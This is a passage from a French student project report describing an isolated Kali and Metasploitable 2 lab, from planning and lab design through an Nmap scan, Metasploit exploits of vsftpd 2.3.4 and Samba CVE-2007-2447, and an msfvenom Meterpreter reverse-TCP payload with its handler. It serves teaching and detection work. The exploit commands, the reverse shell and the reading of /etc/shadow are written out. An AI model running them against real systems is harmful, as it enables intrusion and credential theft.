+(En cours), Code Review / Testing (Revue technique et validation) et Done (Terminé).
+3.5.2 Analyse du chemin critique et interdépendances
+La planiﬁcation temporelle met en relief des dépendances strictes de type Fin-à-Début (FD)
+qui régissent le projet :
+— L’exécution des vagues d’attaque (T2.2) requiert impérativement la validation et le test
+d’étanchéité de l’infrastructure réseau isolée (T1.3).
+— La phase de rétro-ingénierie dans Ghidra (T3.3) est conditionnée par la livraison et l’ex-
+traction réussie de la charge utile msfvenom (T3.2). Un retard sur la génération du payload
+bloque immédiatement l’analyse inversée.
+— La conception des règles YARA et Snort (WP4) dépend directement de la pertinence des
+Indicateurs de Compromission (IoCs) découverts lors de l’analyse (WP3).
+L’enchaînement logique T1.3 → T3.2 → T3.3 → T4.2 matérialise le chemin critique du projet.
+Tout retard constaté sur l’une de ces activités impacterait immédiatement la date de soumission
+du rapport ﬁnal.
+3.5.3 Tableau de suivi des jalons intermédiaires (Milestones)
+Le tableau 3.3 récapitule les échéances fermes convenues avec l’encadrant du projet :
+3.5.4 Visualisation du Diagramme de Gantt du Projet
+Le diagramme graphique ci-dessous illustre l’ordonnancement temporel global, l’étalement
+linéaire des tâches sur les 8 semaines de réalisation, ainsi que les liens de précédence inter-tâches
+gérés sous Jira / MS Project.
+—
+17
+
+=== PAGE 29 ===
+CHAPITRE 3. CONDUITE ET GESTION DU PROJET EMSI
+Jalon Semaines Détail du Livrable T emporel Attendu
+J1 Semaines 01 02 Lab virtuel à 2 VMs opérationnel, outils déployés et scan Nmap
+documenté.
+J2 Semaines 03 04 Exploitations des CVE réussies, payload C2 actif et traﬁc ré-
+seau .pcap capturé.
+J3 Semaines 05 06 Rapports d’analyse statique sous Ghidra et analyse dynamique
+ﬁnalisés.
+J4 Semaines 07 08 Règles YARA et Snort testées, rapport ﬁnal rédigé et prépa-
+ration à la soutenance.
+Table 3.3 – Tableau des échéances intermédiaires et jalons du projet.
+Figure 3.1 – Diagramme de Gantt du projet issu de l’outil Jira.
+3.6 Plan d’assurance qualité et Gestion des risques
+3.6.1 Procédures du Plan d’Assurance Qualité (PAQ)
+Pour garantir une rigueur documentaire et technique conforme aux exigences de l’école, quatre
+procédures de contrôle qualité ont été appliquées :
+1. Validation croisée des exploits : Chaque manipulation oﬀensive ou script d’exploitation
+est testé et validé de manière croisée par les deux membres du binôme avant d’être oﬃ-
+ciellement consigné dans le rapport.
+2. Politique stricte de Snapshots : Aﬁn de garantir la reproductibilité, un instantané propre
+des états mémoires des deux machines virtuelles est obligatoirement sauvegardé avant
+d’initialiser une nouvelle phase critique d’attaque.
+3. Tests d’intégration automatisés des signatures : Les règles YARA et les signatures Snort
+rédigées subissent une phase d’évaluation automatique face au malware et au ﬁchier de
+capture .pcap pour mesurer leur eﬃcacité réelle et éliminer les faux positifs.
+4. Revue par les pairs et gestion de versions : Les livrables textuels et de code sont soumis
+à une relecture mutuelle rigoureuse et versionnés sur un dépôt Git privé permettant la
+traçabilité complète des modiﬁcations du document.
+3.6.2 Matrice d’analyse des risques et plans de contingence
+Le tableau 3.4 classe les événements indésirables potentiels susceptibles de perturber le bon
+déroulement des opérations et déﬁnit les contre-mesures associées.
+18
+
+
+=== PAGE 30 ===
+CHAPITRE 3. CONDUITE ET GESTION DU PROJET EMSI
+Nature du
+Risque
+P I Crit. Stratégie d’Atténuation / Plan de
+Contingence
+Infection ou
+compromission
+de la machine
+hôte
+1 5 5 Conﬁguration stricte des cartes réseau
+virtuelles sur le mode exclusif "Host-
+Only". Désactivation des dossiers parta-
+gés bidirectionnels et du presse-papiers
+partagé entre Kali Linux et l’hôte phy-
+sique lors de l’exécution des charges
+utiles.
+Saturation ou
+instabilité des
+ressources phy-
+siques
+4 2 8 Choix rigoureux d’une architecture sobre
+limitée à un binôme de 2 VMs (Kali et
+Metasploitable). Désactivation totale de
+l’interface graphique (GUI) de la ma-
+chine cible Metasploitable 2 pour réduire
+son empreinte mémoire à moins de 1 Go
+de RAM.
+Échec d’analyse
+de ﬂux binaires
+complexes
+2 4 8 Choix délibéré de compiler une charge
+utile "stageless" non chiﬀrée et dénuée
+d’obfuscation lourde lors de la phase msf-
+venom pour se focaliser sur la compré-
+hension des mécanismes d’appels de base
+(VirtualAlloc, connect). [ 5]
+Corruption des
+données du labo-
+ratoire
+3 3 9 Sauvegardes hebdomadaires externali-
+sées des ﬁchiers sources LaTeX et des
+conﬁgurations de laboratoire, combinées
+à l’utilisation systématique des snap-
+shots de l’hyperviseur.
+Table 3.4 – Matrice d’évaluation des risques et stratégies d’atténuation.
+19
+
+=== PAGE 31 ===
+Chapitre 4
+Analyse et conception
+4.1 Introduction
+Ce chapitre décrit en détail larchitecture technique du laboratoire virtuel, les besoins fonc-
+tionnels et non fonctionnels du projet, les outils sélectionnés ainsi que la conception globale de
+la solution simulée. La phase danalyse et de conception constitue une étape cruciale de notre
+démarche : elle déﬁnit les fondations techniques, méthodologiques et sécuritaires sur lesquelles
+repose lensemble de notre travail pratique. En ingénierie de la cybersécurité, la modélisation ri-
+goureuse de l’environnement d’expérimentation est un prérequis obligatoire pour garantir la vali-
+dité des résultats. Un laboratoire mal conﬁguré, des outils mal choisis ou une architecture réseau
+non réﬂéchie peuvent non seulement compromettre lintégrité du système hôte, mais également
+fausser l’analyse des comportements malveillants, indépendamment de la qualité des opérations
+oﬀensives et défensives menées par la suite.
+4.2 Besoins fonctionnels
+Les besoins fonctionnels décrivent les actions concrètes et les capacités opérationnelles que
+le système ou l’expérimentateur doit être en mesure d’exécuter tout au long du cycle de vie du
+projet. Dans le cadre de ce laboratoire, ils se structurent autour de trois piliers complémentaires :
+l’oﬀensive, l’ingénierie inverse et la détection.
+4.2.1 Simulation de la phase oﬀensive (Fondamental)
+Cette dimension fondamentale vise à reproduire ﬁdèlement le comportement d’un attaquant
+aﬁn d’identiﬁer les failles de sécurité et de comprendre la cinématique d’une intrusion réseau.
+— Réaliser un scan réseau complet et détaillé pour identiﬁer les services actifs, leurs ver-
+sions exactes et les vulnérabilités potentielles sur la machine cible Metasploitable 2, en
+exploitant l’outil Nmap avec des options avancées (-sV, -sC, -O).
+— Identiﬁer et exploiter activement les vulnérabilités CVE connues et critiques : d’une part,
+la vulnérabilité vsftpd 2.3.4 (CVE-2011-2523) via le déclenchement de la backdoor FTP
+historique, et d’autre part, la faille Samba 3.0.20 (CVE-2007-2447) via linjection de com-
+mandes arbitraires dans le champ username.
+— Générer un binaire malveillant (payload) Meterpreter personnalisé à l’aide de l’utilitaire
+msfvenom et conﬁgurer un gestionnaire d’écoute pour établir une session de Command &
+Control (C2) stable et persistante entre les deux machines.
+— Capturer lintégralité des ﬂux et du traﬁc réseau générés lors de la phase dexploitation et
+de contrôle à l’aide du sniﬀer Wireshark, puis sauvegarder ces traces brutes sous format
+de ﬁchier .pcap pour une analyse forensique ultérieure.
+20
+
+=== PAGE 32 ===
+CHAPITRE 4. ANALYSE ET CONCEPTION EMSI
+4.2.2 Analyse du payload Reverse Engineering (Fondamental)
+L’ingénierie inverse permet de disséquer le fonctionnement interne d’un code malveillant aﬁn
+d’en comprendre la logique logique sans disposer du code source d’origine, une compétence clé
+pour l’analyse de menaces modernes.
+— Désassembler et décompiler le binaire malveillant généré dans l’atelier de rétro-ingénierie
+Ghidra aﬁn de traduire le code machine en une représentation textuelle lisible sous forme
+de pseudo-C.
+— Identiﬁer de manière chirurgicale les fonctions clés et les API système invoquées par le
+payload dans Ghidra, notamment les fonctions dédiées à lallocation de mémoire (Virtua-
+lAlloc), à linjection de code en mémoire (CreateRemoteThread) et à létablissement des
+sockets réseau (connect()).
+— Analyser la section des chaînes de caractères (strings) présentes dans le binaire décompilé
+pour en extraire les indicateurs de compromission statiques, tels que les adresses IP codées
+en dur, les signatures de processus, les noms de mutex ou les clés de registre ciblées.
+— Analyser le ﬁchier de capture réseau .pcap avec Wireshark aﬁn de corréler les actions
+logicielles observées dans Ghidra avec les patterns de communication réels du protocole
+de communication de Meterpreter.
+4.2.3 Détection et défense (Important)
+La phase défensive valorise l’ensemble des connaissances acquises lors des étapes précédentes
+en traduisant les indicateurs techniques en signatures de détection exploitables par des solutions
+de sécurité industrielles.
+— Rédiger des règles de signature YARA précises, basées sur l’agencement des chaînes de
+caractères et des expressions régulières identiﬁées lors de lingénierie inverse statique dans
+Ghidra, pour bloquer le ﬁchier au niveau du système de ﬁchiers.
+— Rédiger des règles Snort/Suricata spéciﬁques, basées sur l’analyse des entêtes, des ports
+et des payloads du traﬁc C2 capturé dans le ﬁchier .pcap, aﬁn d’intercepter la menace au
+niveau du périmètre réseau.
+— Tester, aﬃner et valider l’eﬃcacité réelle des règles de détection directement sur l’échan-
+tillon binaire et sur le ﬂux réseau capturé, en documentant le taux de réussite et en
+s’assurant de l’absence de faux positifs.
+— Appliquer les correctifs de sécurité appropriés aux vulnérabilités exploitées sur la machine
+victime et documenter de manière exhaustive les mesures de remédiation, de conﬁguration
+sécurisée et de durcissement (hardening) correspondantes.
+4.3 Besoins non fonctionnels
+Les besoins non fonctionnels déﬁnissent les exigences de qualité, les contraintes opération-
+nelles, les critères de performance et le cadre de sécurité dans lequel l’infrastructure doit évoluer.
+Ils garantissent que les manipulations oﬀensives ne présentent aucun risque pour l’environnement
+externe.
+— Isolation : L’environnement de test doit être strictement cloisonné via un réseau virtuel de
+type Host-Only (Réseau privé hôte). Aucune machine virtuelle ne doit disposer dun accès
+direct ou indirect à Internet lors des phases dattaque active, éliminant ainsi techniquement
+tout risque de fuite ou de propagation accidentelle du code malveillant.
+— Reproductibilité : La conﬁguration logicielle, l’installation des outils et le déroulement des
+scénarios d’attaque doivent être entièrement reproductibles à partir de la documentation
+fournie, garantissant qu’un tiers puisse obtenir des résultats identiques sans étapes de
+conﬁguration implicites.
+21
+
+=== PAGE 33 ===
+CHAPITRE 4. ANALYSE ET CONCEPTION EMSI
+— Sécurité : Les payloads, exploits et échantillons malveillants manipulés ne doivent en au-
+cun cas quitter lenvironnement virtualisé contrôlé. Le transfert d’artefacts vers le système
+hôte ou vers des partages externes non surveillés is strictement proscrit.
+— Traçabilité : Toutes les commandes système exécutées, les scripts d’exploitation lancés et
+les résultats d’alertes obtenus doivent faire l’objet d’un archivage rigoureux, matérialisé
+par des captures décran annotées, des journaux de logs extraits et un horodatage précis.
+— Portabilité : L’architecture du laboratoire doit être conçue pour fonctionner de manière
+transparente sur les architectures Windows et Linux via l’hyperviseur VirtualBox, en
+veillant à ce que l’ensemble des outils sélectionnés soient open source ou multiplateformes.
+4.4 Architecture du laboratoire virtuel
+Lintégralité du projet est matérialisée au sein dun environnement virtualisé isolé composé de
+deux machines virtuelles principales. Cette topologie minimaliste et ciblée a été spéciﬁquement
+sélectionnée pour sa légèreté matérielle, sa stabilité opérationnelle et sa capacité à concentrer
+l’attention sur les mechanisms fondamentaux de la Cyber Kill Chain, sans la complexité de
+routage propre aux infrastructures multi-sites.
+Machine Rôle Système dexploitation IP (réseau isolé)
+Kali Linux 2024 Machine attaquante Kali Linux 2024 (Debian) 192.168.1.2
+Metasploitable 2 Machine victime Ubuntu 8.04 (vulnérable) 192.168.1.3
+Table 4.1 – Architecture du laboratoire virtuel
+Pour interconnecter ces entités, le choix s’est porté sur un mode réseau Host-Only. Ce mécanisme
+virtualise un commutateur logicielle (switch) interne à l’hyperviseur, complètement déconnecté de
+la carte réseau physique de la machine physique. Ainsi, les deux machines virtuelles partagent un
+même domaine de diﬀusion de niveau 2 et peuvent s’échanger des paquets IP de manière bidirec-
+tionnelle, sans qu’aucun ﬂux ne puisse transiter vers la passerelle Internet de l’hôte. L’hyperviseur
+recommandé pour supporter cette infrastructure est Oracle VirtualBox pour sa ﬂexibilité, bien
+que la topologie reste compatible avec VMware Workstation.
+[Figure : 1]
+Figure 4.1 – Architecture du laboratoire virtuel (réseau Host-Only)
+4.5 Outils et technologies
+Le choix des solutions logicielles répond à des critères stricts basés sur l’interopérabilité, la
+gratuité d’accès et la représentativité sur le marché professionnel. Les outils suivants ont été
+sélectionnés pour orchestrer ce projet. Ils constituent larsenal standard et incontournable utilisé
+quotidiennement par les analystes SOC, les pentesters et les ingénieurs en rétro-ingénierie dans
+lindustrie de la cybersécurité.
+22
+
+
+=== PAGE 34 ===
+CHAPITRE 4. ANALYSE ET CONCEPTION EMSI
+Outil Usage Catégorie
+Nmap Scan de ports, identiﬁcation des versions et OS Reconnaissance
+Metasploit Framework Exploitation de CVE sur Metasploitable 2 Exploitation
+msfvenom Génération de payloads Meterpreter personnalisés Post-exploitation
+Wireshark Capture et analyse du traﬁc C2 (.pcap) Analyse réseau
+Ghidra (NSA) Désassemblage, décompilation et RE du payload RE Statique
+YARA Règles de détection basées sur les strings du payload Détection
+Snort Règles de détection basées sur le traﬁc C2 Détection réseau
+Table 4.2 – Outils et technologies utilisés
+L’intégration de ces diﬀérents outils ne s’eﬀectue pas de manière isolée, mais suit une logique
+de chaîne d’outils interconnectée ( toolchain). Les résultats de la reconnaissance alimentent les
+modules d’exploitation, tandis que les données brutes issues de l’attaque (ﬁchiers binaires et
+captures réseau) servent de matière première exclusive pour les outils d’ingénierie inverse et de
+génération de signatures défensives, comme l’illustre la cartographie fonctionnelle ci-dessous.
+[Figure : 3]
+Figure 4.2 – Matrice dinteropérabilité et ﬂux de données entre les outils oﬀensifs et défensifs
+4.6 Architecture de la chaîne dattaque simulée
+La chaîne dattaque mise en uvre au sein de notre plateforme adopte la structure méthodolo-
+gique formalisée par le modèle de la Cyber Kill Chain de Lockheed Martin. Ce canevas linéaire
+est particulièrement adapté pour décomposer de manière séquentielle et didactique les diﬀérentes
+phases logiques d’une intrusion cybernétique. Notre scénario enrichit ce modèle classique en y
+intégrant un volet post-attaque complet axé sur la défense active :
+— Phase 1 Reconnaissance (Reconnaissance) : Cartographie active de la cible Metasploitable
+2 à l’aide de requêtes ICMP et TCP SYN via Nmap. Cette étape permet de lister les ports
+ouverts, de déduire le système d’exploitation sous-jacent, d’analyser les bannières appli-
+catives exposées et de lier ces informations à des vulnérabilités logicielles publiquement
+documentées.
+— Phase 2 Armement (Weaponization) : Conception de l’arme logique. À l’aide de l’outil
+msfvenom, nous assemblons un code d’exécution à distance (payload) conﬁguré pour ini-
+tier une connexion réseau inverse (Reverse TCP) vers la machine de l’attaquant sur le
+port standard 4444.
+— Phase 3 Exploitation (Exploration) : Phase d’accès initial. Nous conﬁgurons et exécutons
+les modules d’attaque au sein du Metasploit Framework pour cibler la vulnérabilité ap-
+plicative du service vsftpd (backdoor) puis celle du service de partage de ﬁchiers Samba
+(usermap_script), convertissant les failles de conﬁguration en accès administrateur (root).
+— Phase 4 Installation et C2 (Installation & Command and Control) : Consolidation de la
+position. La session interactive Meterpreter est ouverte, liant la victime à la console de
+23
+
+
+=== PAGE 35 ===
+CHAPITRE 4. ANALYSE ET CONCEPTION EMSI
+contrôle de l’attaquant. Parallèlement, Wireshark enregistre de manière transparente les
+paquets échangés aﬁn d’isoler la signature réseau de ce canal d’ordre.
+— Phase 5 Ingénierie inverse (Reverse Engineering) : Analyse post-incident. Le binaire
+généré en phase 2 est soumis à une analyse statique approfondie dans Ghidra. Le code
+assembleur est restructuré en pseudo-C aﬁn de localiser les fonctions d’appels système
+suspectes et de cartographier la structure interne de l’artefact.
+— Phase 6 Détection et remédiation (Defensive Actions) : Élaboration des contre-mesures.
+Les signatures textuelles issues de Ghidra alimentent l’écriture de règles YARA, tandis que
+les signatures de ﬂux issues de Wireshark permettent de construire des règles Snort. Enﬁn,
+les processus vulnérables de la cible sont durcis pour clore déﬁnitivement les vecteurs
+d’entrée.
+[Figure : 2]
+Figure 4.3 – Diagramme des phases de la Cyber Kill Chain appliqué au projet
+Au-delà de l’enchaînement chronologique des actions, ce scénario met en évidence une boucle de
+rétroaction essentielle pour un ingénieur en cybersécurité. L’analyse comportementale et structu-
+relle du malware menée en ﬁn de cycle permet d’extraire des indicateurs techniques exploitables
+(IOCs) qui viennent alimenter de manière itérative les briques de détection de l’infrastructure, as-
+surant ainsi une transition ﬂuide de la phase d’investigation à la mise en place de contre-mesures
+opérationnelles.
+[Figure : 4]
+Figure 4.4 – Cinématique de transition opérationnelle : de l’analyse d’artefacts malveillants à
+la création de signatures défensives
+24
+
+
+=== PAGE 36 ===
+CHAPITRE 4. ANALYSE ET CONCEPTION EMSI
+4.7 Conclusion
+En somme, ce chapitre a permis de poser le cadre théorique et technique indispensable au bon
+déroulement des opérations pratiques du projet. Nous avons formellement modélisé larchitecture
+du laboratoire virtuel autour d’un binôme étanche composé de Kali Linux et de Metasploitable
+2, interconnectés au sein d’un segment réseau isolé en mode Host-Only. La déﬁnition claire des
+besoins fonctionnels et le choix réﬂéchi d’outils alignés sur les standards de l’industrie garantissent
+la viabilité de l’étude. Cette phase de conception architecturale étant achevée et sécurisée, elle
+constitue le socle méthodologique sur lequel va s’appuyer la réalisation technique détaillée dans
+le chapitre suivant.
+25
+
+=== PAGE 37 ===
+Chapitre 5
+Réalisation et résultats
+5.1 Introduction
+Ce chapitre constitue le cur technique et expérimental de notre rapport de projet de ﬁn
+d’année. Il décrit de manière exhaustive le déroulement opérationnel de chaque phase de la
+chaîne dattaque simulée, les commandes exécutées, les résultats techniques obtenus, les analyses
+structurelles eﬀectuées avec l’atelier Ghidra ainsi que les règles de détection comportementales
+et statiques produites. Fidèle aux principes fondamentaux de la sécurité de l’information, chaque
+étape est présentée avec ses pré-requis d’infrastructure, sa procédure pas-à-pas et ses résultats
+attendus. Cette rigueur descriptive vise à garantir une reproduction complète et transparente du
+travail en laboratoire, validant ainsi la transition théorique entre la modélisation de la menace
+et sa remédiation concrète. De plus, ce chapitre met en lumière les livrables de valorisation
+développés, notamment une plateforme web didactique et un support vidéo illustrant la viabilité
+de notre démonstration de faisabilité (PoC).
+5.2 Mise en place du laboratoire virtuel
+Lenvironnement de test et de simulation a été entièrement conçu et déployé sous l’hyper-
+viseur Oracle VirtualBox, en exploitant une architecture composée de deux machines virtuelles
+interconnectées de manière étanche via un réseau privé hôte (Host-Only). La conﬁguration de
+ce segment réseau virtuel représente létape la plus critique du déploiement : les deux entités
+doivent impérativement être rattachées au même commutateur logiciel interne (par exemple ń
+VirtualBox Host-Only Ethernet Adapter ż), sous peine d’isoler les machines et d’empêcher toute
+communication bidirectionnelle au niveau de la couche liaison de données.
+La machine attaquante s’appuie sur la distribution Kali Linux 2024 (conﬁgurée avec l’adresse
+IP ﬁxe 192.168.1.2), largement reconnue comme le standard industriel pour les audits de sé-
+curité et les tests d’intrusion. Cet environnement embarque nativement lensemble des boîtes à
+outils oﬀensives nécessaires à notre étude, telles que le scanner de vulnérabilités Nmap, le Me-
+tasploit Framework, l’utilitaire de génération de charges utiles msfvenom, ainsi que l’analyseur
+de protocoles Wireshark. En revanche, l’atelier de rétro-ingénierie Ghidra a fait l’objet d’une
+installation manuelle distincte depuis les dépôts oﬃciels de la NSA (ghidra-sre.org), nécessitant
+le déploiement préalable d’un environnement d’exécution Java moderne (JDK 17+).
+La machine cible, représentant notre surface d’attaque, est propulsée par l’image Metasploi-
+table 2 (conﬁgurée avec l’adresse IP ﬁxe 192.168.1.3). Développée par Rapid7 sur une base
+Linux Ubuntu 8.04 périmée, cette machine virtuelle a été intentionnellement aﬀaiblie et conﬁgu-
+rée pour exposer un large éventail de services lourdement vulnérables : des protocoles de transfert
+de ﬁchiers (vsftpd 2.3.4), des services de partage de ressources (SMB/Samba 3.0.20), des registres
+d’appels distants (Java RMI), ainsi que des serveurs de bases de données (MySQL) accessibles
+26
+
+=== PAGE 38 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+sans authentiﬁcation. Compte tenu du niveau de criticité de ces failles, cette machine constitue
+un risque cybermajeur et ne doit en aucun cas être connectée à une interface réseau pontée ou
+disposant d’un accès à l’Internet public.
+Enﬁn, une politique stricte de gestion des instantanés (snapshots) a été appliquée immédia-
+tement après la conﬁguration initiale de chaque système. Cette mesure forensique garantit la
+parfaite reproductibilité des scénarios d’attaque, permettant de réinitialiser instantanément les
+machines virtuelles dans un état intègre et "propre" entre chaque manipulation, éliminant ainsi
+les artefacts résiduels des attaques précédentes qui pourraient fausser les journaux d’audit (logs)
+ou altérer le comportement des payloads.
+[Figure : 1 network]
+Figure 5.1 – Capture de la conﬁguration réseau Host-Only dans VirtualBox
+5.3 Phase de reconnaissance Scan Nmap
+Première étape incontournable de la Cyber Kill Chain, la phase de reconnaissance tactique
+vise à cartographier méthodiquement le périmètre réseau de la cible aﬁn d’identiﬁer les ports
+TCP/UDP ouverts, de déterminer la nature et la version exacte des démons applicatifs en écoute,
+et d’en déduire la présence de vulnérabilités exploitables. L’outil Nmap (Network Mapper) a
+été sélectionné pour orchestrer cette phase. Grâce à l’envoi de paquets spéciﬁques (TCP SYN,
+requêtes ICMP, sondes de bannières), il permet de contourner les mécanismes de ﬁltrage basiques
+et d’interroger ﬁnement la pile TCP/IP du système distant.
+La commande de balayage exhaustif suivante a été exécutée depuis le terminal root de la
+machine Kali Linux :
+nmap - sV - sC -O -p - 1 9 2 . 1 6 8 . 1 . 3 - oN s c a n _ m e t a s p l o i t a b l e . txt
+L’évaluation détaillée des commutateurs (ﬂags) de cette ligne de commande met en évidence
+une stratégie de reconnaissance agressive mais nécessaire dans un cadre de laboratoire :
+— -sV : Active la détection active des versions des services en interrogeant les bannières
+textuelles renvoyées par les ports lors de l’établissement de la connexion ou en analysant
+les réponses à des sondes applicatives spéciﬁques.
+— -sC : Déclenche l’exécution des scripts de base intégrés au moteur NSE (Nmap Scripting
+Engine) aﬁn d’automatiser la détection de failles de sécurité courantes, l’énumération
+d’utilisateurs ou la collecte de conﬁgurations non sécurisées.
+— -O : Initie l’analyse de l’empreinte du système d’exploitation en comparant les subtilités
+des réponses de la cible (taille des fenêtres TCP, options IP, valeurs TTL) à une base de
+données de référence.
+— -p- : Impose un balayage complet de l’ensemble de la plage de ports TCP, s’étendant du
+port 1 au port 65535, empêchant ainsi l’omission d’un service malveillant ou non standard
+dissimulé sur un port élevé.
+— -oN : Dirige la sortie brute de l’outil vers un ﬁchier texte structuré nommé scan_metasploitable.txt,
+assurant la persistance des données pour les phases d’analyse ultérieures.
+27
+
+
+=== PAGE 39 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+Ce scan approfondi a mis en évidence une surface d’attaque particulièrement critique, carac-
+térisée par une multitude de ports ouverts et de services obsolètes synthétisés dans le tableau
+suivant :
+Port Service V ersion CVE / V ulnérabilité Sévérité
+21/tcp vsftpd 2.3.4 CVE-2011-2523 (back-
+door)
+Critique
+139/445/tcp Samba 3.0.20 CVE-2007-2447 (injection
+commande)
+Critique
+1099/tcp Java RMI Registry RCE sans authentiﬁcation Critique
+3306/tcp MySQL 5.0.51a Accès root sans mot de
+passe
+Critique
+8180/tcp Apache Tomcat 5.5 Credentials par défaut +
+W AR upload
+Critique
+22/tcp OpenSSH 4.7p1 Accès avec credentials
+msfadmin
+Haute
+Table 5.1 – Résultats du scan Nmap ports, services et criticité
+[Figure : 3]
+Figure 5.2 – Résultats complets du scan Nmap sur Metasploitable 2
+5.4 Phase dexploitation Metasploit Framework
+Une fois la phase de reconnaissance achevée et la surface d’attaque documentée, nous bascu-
+lons dans la phase d’armement et d’exploitation en exploitant le Metasploit Framework. Cet outil
+modulaire centralise des milliers d’exploits ﬁabilisés et de charges utiles, ce qui permet d’étudier
+de manière standardisée le comportement des vulnérabilités logicielles et de valider les vecteurs
+d’intrusion identiﬁés lors de la phase précédente.
+5.4.1 Exploit 1 vsftpd 2.3.4 (CVE-2011-2523)
+La vulnérabilité référencée CVE-2011-2523 illustre parfaitement le concept d’attaque sur la
+chaîne d’approvisionnement ( supply chain attack ). En juillet 2011, des acteurs malveillants ont
+compromis les serveurs de distribution oﬃciels du démon vsftpd pour injecter une porte dérobée
+(backdoor) directement dans l’archive du code source de la version 2.3.4. Le mécanisme logique
+de cette trappe est d’une simplicité redoutable : lors d’une tentative de connexion sur le service
+FTP, si l’identiﬁant envoyé par l’utilisateur se termine par la séquence spéciﬁque de caractères
+:) (représentant un smiley), le code malveillant intercepte la requête, court-circuite le processus
+d’authentiﬁcation standard, et instancie un interpréteur de commandes ( /bin/sh) en écoute sur
+le port TCP 6200. Le démon s’exécutant nativement avec les privilèges les plus élevés, ce shell
+hérite automatiquement des droits de l’administrateur root.
+28
+
+
+=== PAGE 40 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+Pour orchestrer cette intrusion depuis msfconsole, les commandes suivantes ont été appli-
+quées :
+use exploit / unix / ftp / v s f t p d _ 2 3 4 _ b a c k d o o r
+set RHOSTS 1 9 2 . 1 6 8 . 1 . 3
+exploit
+L’exécution du module conﬁrme la vulnérabilité immédiate de la cible : le framework détecte
+l’ouverture du port dérobé 6200 et y rattache un ﬂux d’entrée/sortie interactif. L’interrogation
+du système via la commande id renvoie explicitement la chaîne uid=0(root) gid=0(root) ,
+attestant d’un compromis total du système d’exploitation sous-jacent.
+[Figure : 4]
+Figure 5.3 – Shell root obtenu via la backdoor vsftpd 2.3.4 (CVE-2011-2523)
+5.4.2 Exploit 2 Samba 3.0.20 (CVE-2007-2447)
+La faille de sécurité CVE-2007-2447 (connue sous le nom de MS-RPC usermap_script ) réside
+dans le sous-système de partage de ﬁchiers et d’imprimantes Samba, spéciﬁquement au sein des
+versions comprises entre 3.0.20 et 3.0.25rc3. Lorsque la directive de conﬁguration non standard
+username map script est activée dans le ﬁchier smb.conf, l’application transmet directement
+le nom d’utilisateur fourni par le client à un script externe via l’interpréteur de commandes
+système du serveur ( /bin/sh). L’absence totale de ﬁltrage ou d’échappement des métacaractères
+shell lors de cette transition permet à un attaquant de réaliser une injection de commandes à
+distance (RCE).
+En encapsulant des commandes arbitraires au sein de caractères d’évaluation (backticks ‘ ‘
+ou substitution de commande $( ) ) à l’intérieur du champ d’authentiﬁcation du nom d’utilisa-
+teur, l’attaquant force le processus Samba à exécuter ses propres directives avec les privilèges du
+démon applicatif, qui s’exécute ici en tant que root.
+La conﬁguration et le lancement de l’attaque s’articulent autour du bloc de commandes
+suivant :
+use exploit / multi / samba / u s e r m a p _ s c r i p t
+set RHOSTS 1 9 2 . 1 6 8 . 1 . 3
+set PAYLOAD cmd / unix / reverse
+set LHOST 1 9 2 . 1 6 8 . 1 . 2
+set LPORT 4444
+exploit
+Le succès de l’opération se traduit par l’établissement immédiat d’un canal de communication
+inverse (reverse shell ) se connectant depuis la machine Metasploitable vers le port d’écoute 4444
+de la machine Kali Linux. À partir de ce point d’accès, l’exécution de commandes d’investigation
+avancées comme cat /etc/shadow ou netstat -antp permet d’extraire les hashes de mots de
+passe du système et de cartographier l’intégralité des sockets réseau actifs.
+29
+
+
+=== PAGE 41 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+[Figure : 5]
+Figure 5.4 – Shell root obtenu via linjection Samba (CVE-2007-2447)
+5.5 Déploiement du payload et capture C2
+L’accès initial ayant été consolidé via les vulnérabilités applicatives, l’étape suivante consiste
+à simuler une phase de post-exploitation réaliste en générant et déployant une charge utile (pay-
+load) évoluée de type Command & Control (C2). Ce binaire personnalisé fera oﬃce d’échantillon
+d’étude exclusif pour notre phase ultérieure de rétro-ingénierie dans Ghidra.
+Pour ce faire, notre choix s’est porté sur la technologie Meterpreter de Metasploit. Contrai-
+rement aux coquilles de commandes ( shells ) traditionnelles, Meterpreter utilise des mécanismes
+d’injection de DLL réﬂéchie ( Reﬂective DLL Injection ) lui permettant de s’exécuter intégrale-
+ment au sein de l’espace mémoire d’un processus légitime existant (in-memory), sans jamais
+toucher le système de ﬁchiers (disque) de la machine victime sous sa forme décompressée. Cette
+furtivité logicielle lui permet d’échapper aux analyses de signatures statiques des solutions de sé-
+curité conventionnelles. Aﬁn de mener à bien notre analyse statique ultérieure, nous conﬁgurons
+la charge en mode stageless (indépendante), garantissant que l’intégralité du code de contrôle et
+des extensions réseau soit compilée au sein d’un unique exécutable.
+Le binaire malveillant a été généré sur la console Kali Linux via l’outil msfvenom, suivi d’un
+calcul rigoureux de ses empreintes cryptographiques pour assurer la traçabilité de l’artefact :
+msfvenom -p windows / m e t e r p r e t e r / r e v e r s e _ t c p LHOST = 1 9 2 . 1 6 8 . 1 . 2 LPORT =4444
+-f exe -o / tmp / p a y l o a d _ a n a l y s e . exe
+md5sum / tmp / p a y l o a d _ a n a l y s e . exe
+sh a2 56 su m / tmp / p a y l o a d _ a n a l y s e . exe
+Parallèlement, la console Metasploit est conﬁgurée avec le module de gestion d’écoute géné-
+rique multi/handler pour intercepter la future connexion en arrière-plan :
+use exploit / multi / handler
+set PAYLOAD windows / m e t e r p r e t e r / r e v e r s e _ t c p
+set LHOST 1 9 2 . 1 6 8 . 1 . 2
+set LPORT 4444
+exploit -j
+Aﬁn d’isoler la signature réseau de cette communication C2, l’outil Wireshark est instancié
+sur l’interface réseau virtuelle Host-Only, conﬁguré avec le ﬁltre d’aﬃchage strict tcp.port ==
+4444. Lors de l’exécution du payload sur l’environnement d’essai, Wireshark enregistre en temps
+réel l’établissement de la poignée de main TCP (3-way handshake) ainsi que les échanges de
+paquets périodiques ( beaconing) initiés par le malware vers son serveur de contrôle. La session
+de capture brute est exportée au format standard c2_traffic.pcap pour servir de base de
+modélisation à nos outils de détection réseau.
+30
+
+
+=== PAGE 42 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+[Figure : 6]
+Figure 5.5 – Session Meterpreter établie entre Kali et Metasploitable 2
+[Figure : 7]
+Figure 5.6 – Capture du traﬁc C2 Meterpreter dans Wireshark
+5.6 Ingénierie inverse du payload Ghidra
+Lingénierie inverse (Reverse Engineering) désigne la démarche scientiﬁque et technique consis-
